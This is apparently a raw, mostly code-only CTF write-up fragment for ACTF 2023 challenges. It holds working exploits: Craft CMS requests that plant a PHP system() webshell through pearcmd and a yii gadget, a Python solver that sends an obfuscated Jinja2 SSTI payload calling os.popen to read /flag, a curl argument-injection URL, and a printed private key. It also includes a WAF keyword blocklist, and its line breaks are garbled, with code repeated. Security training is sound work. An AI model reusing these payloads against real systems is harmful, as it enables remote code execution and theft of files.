a=0b=7p=115792089237316195423570985008687907853269984665640564039457584007908834671663E=EllipticCurve(Zmod(p),[a,b])d=int('2665bf1dcd6ec3c77f769d1299c2a2ffe616964a81b634c932914ce92d4c2dd7',16)G_x=int('79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798',16)G_y=int('483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8',16)G=E(G_x,G_y)pub=d*Gprint(pub)print(hex(int(pub.xy()[0])))print(hex(int(pub.xy()[1])))
# (91397747157905405488960538017777721206309328713068899403083847758775680259636 : 100378415417354102646968036094699351150291716697745738660415200736280639905072 : 1)
# 0xca114aab2bb7442b66b839f42295cda6aec6ba8ec551f8458594fd1065f05634
# 0xddec2b769f81772b9cdfc05b73184bb179a35829afe17c0daf3aab2d46af1d30
a='308184020100301006072a8648ce3d020106052b8104000a046d306b02010104202665bf1dcd6ec3c77f769d1299c2a2ffe616964a81b634c932914ce92d4c2dd7a14403420004ca114aab2bb7442b66b839f42295cda6aec6ba8ec551f8458594fd1065f05634ddec2b769f81772b9cdfc05b73184bb179a35829afe17c0daf3aab2d46af1d30'import base64aa=bytes.fromhex(a)print(base64.b64encode(aa))
# MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQgJmW/Hc1uw8d/dp0SmcKi/+YWlkqBtjTJMpFM6S1MLdehRANCAATKEUqrK7dEK2a4OfQilc2mrsa6jsVR+EWFlP0QZfBWNN3sK3afgXcrnN/AW3MYS7F5o1gpr+F8Da86qy1Grx0w
charon@root:~/Desktop$ openssl pkey -in prive.pem -text-----BEGIN PRIVATE KEY-----MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQgJmW/Hc1uw8d/dp0SmcKi/+YWlkqBtjTJMpFM6S1MLdehRANCAATKEUqrK7dEK2a4OfQilc2mrsa6jsVR+EWFlP0QZfBWNN3sK3afgXcrnN/AW3MYS7F5o1gpr+F8Da86qy1Grx0w-----END PRIVATE KEY-----Private-Key: (256 bit)priv: 26:65:bf:1d:cd:6e:c3:c7:7f:76:9d:12:99:c2:a2: ff:e6:16:96:4a:81:b6:34:c9:32:91:4c:e9:2d:4c: 2d:
d7pub: 04:ca:11:4a:ab:2b:b7:44:2b:66:b8:39:f4:22:95: cd:a6:ae:c6:ba:8e:c5:51:f8:45:85:94:fd:10:65: f0:56:34:dd:ec:2b:76:9f:81:77:2b:9c:df:c0:5b: 73:18:4b:b1:79:a3:58:29:af:e1:7c:0d:af:3a:ab: 2d:46:af:1d:
30ASN1 OID: secp256k1
java -cp "apps/*:
lib/*:
conf/" org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriberPrivate flag2 conf/amop/prive.pem Start testStep 2:
Receive msg, time: 2023-10-28 14:50:
18topic:
flag2 content:
cHAiN_sO_INterESt1NG}
POST /index.php?+config-create+/&/<?=system($_GET['a'])?>+/tmp/hello.php HTTP/1.1Host: 61.147.171.105:
57690Content-Length: 225Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://61.147.171.105:
57690Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://61.147.171.105:
57690/index.php?+config-create+/&/%3C?=phpinfo()?%3E+Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: CraftSessionId=0f4f73c886a22cb11f6e1980b0c1a1c5; CRAFT_CSRF_TOKEN=0ab61f9f593ede910d55226ba018126504d915a3bfa474065ee4d2d4680bd596a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22vIF55Ar8Ye6Ezz4oJK47ev5Uv6tibRZ_l8ZUZB-9%22%3B%7DConnection: close
action=conditions%2Frender&configObject=craft%5Celements%5Cconditions%5CElementCondition&config={"name":"configObject","as ":{"class":"\yii\rbac\PhpManager","__construct()":[{"itemFile":"/usr/local/lib/php/pearcmd.php"}]}}
POST /index.php?a=cat /flag HTTP/1.1Host: 61.147.171.105:
57690Content-Length: 209Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://61.147.171.105:
57690Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://61.147.171.105:
57690/index.php?+config-create+/&/%3C?=phpinfo()?%3E+Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: CraftSessionId=0f4f73c886a22cb11f6e1980b0c1a1c5; CRAFT_CSRF_TOKEN=0ab61f9f593ede910d55226ba018126504d915a3bfa474065ee4d2d4680bd596a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22vIF55Ar8Ye6Ezz4oJK47ev5Uv6tibRZ_l8ZUZB-9%22%3B%7DConnection: close
action=conditions%2Frender&configObject=craft%5Celements%5Cconditions%5CElementCondition&config={"name":"configObject","as ":{"class":"\yii\rbac\PhpManager","__construct()":[{"itemFile":"/tmp/hello.php"}]}}
def __init__(self, width: int = 160, height: int = 60, key: int = None, length: int = 4, fonts: t.Optional[t.List[str]] = None, font_sizes: t.Optional[t.Tuple[int]] = None): self._width = width self._height = height self._length = length self._key = (key or int(time.time())) + random.randint(1,100) print(self._key) self._fonts = fonts or DEFAULT_FONTS self._font_sizes = font_sizes or (42, 50, 56) self._truefonts: t.List[FreeTypeFont] = [] random.seed(self._key)
while True: now = int(time.time()) session = requests.session() all = 0 payload = '123' res = session.get(url+'captcha') for i in range(1,100): gen = Captcha(200, 80,now+i) buf , captcha_text = gen.generate() if(buf.getvalue()==res.content): print(now+i) seed = now+i print('success')
gen = Captcha(200, 80,seed)buf , captcha_text = gen.generate()code = generate_code()minic_waf(payload)
x = 0while True: x+=1 if minic_waf(payload) == '1': print(x) breakif(x>10): print("more than 10") time.sleep(1) breakprint("x_all:"+str(x))res = session.post(url+'vip',json={"captcha":
code})print(res.cookies)print("a")res = session.post(url+'write',json={"story":
payload})print(res.text)error = []for i in range(x-1): res = session.post(url+'write',json={"story":
payload})
 print(i)payload = '{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}'
res = session.post(url+'write',json={"story":
payload})print(res.text)res = session.get(url+'story')print("result:")print(res.text)
import random
rule = [ ['\x','[',']','.','getitem','print','request','args','cookies','values','getattribute','config'], # rule 1 ['(',']','getitem','_','%','print','config','args','values','|',''','"','dict',',','join','.','set'], # rule 2 [''','"','dict',',','config','join','\x',')','[',']','attr','__','list','globals','.'], # rule 3 ['[',')','getitem','request','.','|','config','popen','dict','doc','\x','_','{{','mro'], # rule 4 ['\x','(',')','config','args','cookies','values','[',']','{{','.','request','|','attr'], # rule 5 ['print', 'class', 'import', 'eval', '__', 'request','args','cookies','values','|','\x','getitem'] # rule 6]
# Make waf more random
def transfrom(number): a = random.randint(0,20) b = random.randint(0,100) return (a * number + b) % 6
def singel_waf(input, rules): input = input.lower() for rule in rules: if rule in input: return False return True
def minic_waf(input): waf_seq = random.sample(range(21),3) result_2 = None result_1 = None result_3 = None for index in range(len(waf_seq)): waf_seq[index] = transfrom(waf_seq[index]) if index == 0: result_1 = rule[waf_seq[index]] elif index == 1: result_2 = rule[waf_seq[index]] else: result_3 = rule[waf_seq[index]] if(result_1==result_2 ==result_3==['\x','[',']','.','getitem','print','request','args','cookies','values','getattribute','config']): print(result_3) return '1' if not singel_waf(input, rule[waf_seq[index]]): return False return True
{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}
import requestsimport timeimport randomfrom utils.captcha import Captchafrom utils.testminic import *
def generate_code(length: int = 4,z=0): characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' return ''.join(random.choice(characters) for _ in range(length))
url = 'http://124.70.33.170:
23001/'url = 'http://127.0.0.1:
5000/'

while True: now = int(time.time()) session = requests.session() all = 0 payload = '123' res = session.get(url+'captcha') for i in range(1,100): gen = Captcha(200, 80,now+i) buf , captcha_text = gen.generate() if(buf.getvalue()==res.content): print(now+i) seed = now+i print('success') gen = Captcha(200, 80,seed) buf , captcha_text = gen.generate() code = generate_code() minic_waf(payload)
 x = 0 while True: x+=1 if minic_waf(payload) == '1': print(x) break if(x>10): print("more than 10") time.sleep(1) break print("x_all:"+str(x)) res = session.post(url+'vip',json={"captcha":
code}) print(res.cookies) print("a") res = session.post(url+'write',json={"story":
payload}) print(res.text) error = [] for i in range(x-1): res = session.post(url+'write',json={"story":
payload})
 print(i) payload = '{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}' res = session.post(url+'write',json={"story":
payload}) print(res.text) res = session.get(url+'story') print("result:") print(res.text) if('ACTF' in res.text): exit(0)
import random
rule = [ ['\x','[',']','.','getitem','print','request','args','cookies','values','getattribute','config'], # rule 1 ['(',']','getitem','_','%','print','config','args','values','|',''','"','dict',',','join','.','set'], # rule 2 [''','"','dict',',','config','join','\x',')','[',']','attr','__','list','globals','.'], # rule 3 ['[',')','getitem','request','.','|','config','popen','dict','doc','\x','_','{{','mro'], # rule 4 ['\x','(',')','config','args','cookies','values','[',']','{{','.','request','|','attr'], # rule 5 ['print', 'class', 'import', 'eval', '__', 'request','args','cookies','values','|','\x','getitem'] # rule 6]
# Make waf more random
def transfrom(number): a = random.randint(0,20) b = random.randint(0,100) return (a * number + b) % 6
def singel_waf(input, rules): input = input.lower() for rule in rules: if rule in input: return False return True
def minic_waf(input): waf_seq = random.sample(range(21),3) result_2 = None result_1 = None result_3 = None for index in range(len(waf_seq)): waf_seq[index] = transfrom(waf_seq[index]) if index == 0: result_1 = rule[waf_seq[index]] elif index == 1: result_2 = rule[waf_seq[index]] else: result_3 = rule[waf_seq[index]] if(result_1==result_2 ==result_3==['\x','[',']','.','getitem','print','request','args','cookies','values','getattribute','config']): print(result_3) return '1' if not singel_waf(input, rule[waf_seq[index]]): return False return True
http://124.70.33.170:
24000/checker?url=-iL%20/flag%20public/index.html%20127.0.0.1
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/5-1698733665.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/5-1698733668.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/7-1698733673.png)